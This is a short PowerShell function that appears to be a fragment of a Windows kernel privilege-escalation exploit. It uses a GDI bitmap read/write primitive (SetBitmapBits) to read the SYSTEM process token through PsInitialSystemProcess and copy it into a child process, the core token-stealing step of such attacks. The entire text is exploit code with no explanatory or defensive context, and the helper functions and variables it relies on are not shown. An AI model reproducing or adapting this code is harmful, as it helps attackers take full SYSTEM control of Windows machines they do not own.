function Invoke-KernelTokenCopy {
    $KernelHandle = [NativeApi]::LoadLibrary($KernelName)
    $SystemProcessExport = [NativeApi]::GetProcAddress($KernelHandle, "PsInitialSystemProcess")
    [Runtime.InteropServices.Marshal]::WriteInt64($Buffer + $BufferOffset, 0)
    [NativeApi]::SetBitmapBits($WorkerBitmap.BitmapHandle, 0x2000, $Buffer)
    $SystemToken = Bitmap-Read -Address ($SystemProcess + $TokenOffset)
    Bitmap-Write -Address ($ChildProcess + $TokenOffset) -Value $SystemToken
}
